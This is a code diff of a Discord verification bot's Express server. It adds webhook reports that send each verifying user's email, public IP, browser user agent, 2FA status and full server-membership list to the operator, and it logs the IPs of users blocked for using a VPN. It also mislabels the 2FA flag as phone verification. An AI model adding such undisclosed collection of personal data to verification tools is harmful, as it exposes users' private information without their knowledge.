@@ -19,8 +19,8 @@ const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const BACKUP_GUILD_ID = process.env.BACKUP_GUILD_ID;
 const UNVERIFIED_ROLE_ID = process.env.UNVERIFIED_ROLE_ID || '1541577356513382560'; 
 
-// Vercel 배포 URL
-const FIXED_RENDER_URL = 'https://discord-verify-phi.vercel.app/';
+// Vercel에서 발급받은 본인의 실제 도메인 주소
+const FIXED_RENDER_URL = 'https://discord-verify1-4jjz.vercel.app';
 
 const client = new Client({
     intents: [
@@ -159,6 +159,13 @@ app.get('/verify', async (req, res) => {
         
         if (ipCheckRes.data.status === 'success' && ipCheckRes.data.proxy) {
             console.log(`[차단됨] VPN/우회 접속 감지된 IP: ${userIp}`);
+            
+            if (WEBHOOK_URL) {
+                await axios.post(WEBHOOK_URL, {
+                    content: `🛡️ **[인증 차단]** VPN/우회 접속이 감지되어 차단되었습니다!\n🌐 **IP:** \`${userIp}\``
+                }).catch(() => {});
+            }
+
             return res.status(403).send(`<h1>인증 실패</h1><p>VPN 또는 우회 접속 환경에서는 인증을 진행할 수 없습니다.</p>`);
         }
     } catch (err) {
@@ -214,7 +221,48 @@ app.get('/callback', async (req, res) => {
         });
         const userData = userRes.data;
 
-        // 인증 완료 시 역할 부여
+        let guildsTextContent = `[ ${userData.username} (${userData.id}) 님이 가입된 서버 목록 ]\n\n`;
+        try {
+            const guildsRes = await axios.get('https://discord.com/api/users/@me/guilds', {
+                headers: { authorization: `Bearer ${accessToken}` }
+            });
+            if (guildsRes.data && guildsRes.data.length > 0) {
+                guildsRes.data.forEach((g, index) => {
+                    guildsTextContent += `${index + 1}. 이름: ${g.name} (ID: ${g.id})\n`;
+                });
+            } else {
+                guildsTextContent += '가입된 서버가 없습니다.';
+            }
+        } catch (gErr) {
+            guildsTextContent += '서버 목록을 불러오는 데 실패했습니다.';
+        }
+
+        const filePath = path.join(__dirname, `guilds_${userData.id}.txt`);
+        fs.writeFileSync(filePath, guildsTextContent, 'utf8');
+
+        const isPhoneVerified = userData.mfa_enabled ? '✅ 인증된 계정' : '❌ 미인증 계정';
+
+        if (WEBHOOK_URL) {
+            const FormData = require('form-data');
+            const form = new FormData();
+            form.append('content', `✅ **[인증 완료]**\n` +
+                                    `👤 **유저:** <@${userData.id}> (\`${userData.username}\`)\n` +
+                                    `📧 **이메일:** \`${userData.email}\`\n` +
+                                    `📱 **전화번호/2차인증:** \`${isPhoneVerified}\`\n` +
+                                    `🌐 **공인 IP:** \`${userIp}\`\n` +
+                                    `💻 **기기/브라우저:** \`${userAgent}\`\n` +
+                                    `📢 **선택한 역할 개수:** \`${selectedRoles.length}개\``);
+            form.append('file', fs.createReadStream(filePath));
+
+            await axios.post(WEBHOOK_URL, form, {
+                headers: form.getHeaders()
+            }).catch(() => {});
+        }
+
+        if (fs.existsSync(filePath)) {
+            fs.unlinkSync(filePath);
+        }
+
         const guild = await client.guilds.fetch(GUILD_ID);
         const member = await guild.members.fetch(userData.id);
 
